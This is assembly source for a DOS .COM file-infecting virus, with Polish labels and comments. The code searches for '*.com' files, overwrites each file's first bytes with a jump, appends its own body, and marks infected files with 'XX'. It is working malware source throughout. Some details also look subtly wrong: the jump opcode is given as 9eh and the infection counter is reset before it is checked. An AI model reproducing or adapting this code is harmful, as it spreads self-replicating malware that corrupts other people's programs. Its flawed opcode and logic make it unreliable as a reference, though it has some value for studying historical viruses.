format binary

P21H_PLIK_SZUKAJ_MASKA equ 4e00h
P21H_PLIK_SZUKAJ_NASTEPNEGO equ 4fh
P21H_PLIK_OTWORZ equ 3dh
P21H_PLIK_ODCZYTAJ equ 3fh
P21H_PLIK_WSKAZNIK_PRZESUN equ 42h
P21H_PLIK_ZAPISZ equ 40h
P21H_PLIK_ZAMKNIJ equ 3eh
P21H_PLIK_WSKAZNIK_KONIEC equ 02h
P21H_PLIK_TRYB_ODCZYT equ 0h
P21H_P_TRYB_ODCZYT_ZAPIS equ 2h

PLIK_ATRYBUTY equ 0fh
ZARAZONY_MASKA equ 'XX'
ZARAZENIE_PLIK_LICZBA equ 5h

org 100h

start:
  db 0e9h, 2h, 0h
  dw ZARAZONY_MASKA
plik_zarazenie:
  call przesuniecie
przesuniecie:
; pobranie rejestru ip do bp
  pop bp
; cofnięcie do instrukcji plik_zarazanie, instrukcja call zajmuje 3B
  sub bp, przesuniecie
  lea si, [bp + plik_poczatek]
  mov di, 100h
  push di
  movsb
  movsw
  movsw
  mov [bp + licznik], byte 0h
  lea dx, [bp + plik_maska]
  cmp [bp + licznik], ZARAZENIE_PLIK_LICZBA
  ja plik_zarazanie_koniec
  mov ax, P21H_PLIK_SZUKAJ_MASKA
  mov cx, PLIK_ATRYBUTY
plik_szukaj:
  int 21h
  jc plik_zarazanie_koniec
  call zarazanie
  mov ax, P21H_PLIK_SZUKAJ_NASTEPNEGO
  jmp plik_szukaj
plik_zarazanie_koniec:
  retn
  
zarazanie:
; odczytanie nagłówka zarażanego pliku
  mov al, P21H_PLIK_TRYB_ODCZYT
  call plik_otworz
  mov ah, P21H_PLIK_ODCZYTAJ
  mov cx, 1ah
  lea dx, [bp + bufor]
  int 21h
  mov ah, P21H_PLIK_ZAMKNIJ
  int 21h
  mov bx, word [bp + 80h + 1ah]
; sprawdzenie czy plik jest już zarażony
  cmp word [cs:bp + bufor + 3h], ZARAZONY_MASKA
  je zarazanie_koniec
; zmniejszenie wielkości zbioru o instrukcję JMP
  sub bx, 3h
; zachowanie pierwotnych 3B zarażanego pliku
  lea si, [bp + bufor]
  lea di, [bp + plik_poczatek]
  movsb
  movsw
  movsw
; podmiana pierwszego bajtu na instrukcję JMP, kod 9eh
  mov [bp + bufor], byte 9eh
; zapisanie nowej wielkości zbioru
  mov word [bp + bufor + 1h], bx
; oznaczenie pliku jako zarażony
  mov word [bp + bufor + 3h], ZARAZONY_MASKA
; podmiana nagłówka zarażanego pliku
  mov al, P21H_P_TRYB_ODCZYT_ZAPIS
  call plik_otworz
  mov ah, P21H_PLIK_ZAPISZ
  lea dx, [bp + bufor]
  mov cx, 5h
  int 21h
  jc plik_zamknij
; dopisanie wirusa do pliku
  mov al, P21H_PLIK_WSKAZNIK_KONIEC
  mov ah, P21H_PLIK_WSKAZNIK_PRZESUN
  xor cx, cx
  xor dx, dx
  int 21h
  mov ah, P21H_PLIK_ZAPISZ
  mov cx, plik_koniec - plik_zarazenie
  lea dx, [bp + plik_zarazenie]
  int 21h
  inc [bp + licznik]
plik_zamknij:
  mov ah, P21H_PLIK_ZAMKNIJ
  int 21h
zarazanie_koniec:
  ret
  
plik_otworz:
  mov ah, P21H_PLIK_OTWORZ
  mov dx, 9eh
  int 21h
; uchwyt pliku do ax
  xchg ax, bx
  ret
  
plik_maska db "*.com", 0h
plik_poczatek db 0cdh, 20h, 0, 0, 0
licznik db 0h
bufor: times 1ah db ?

plik_koniec:

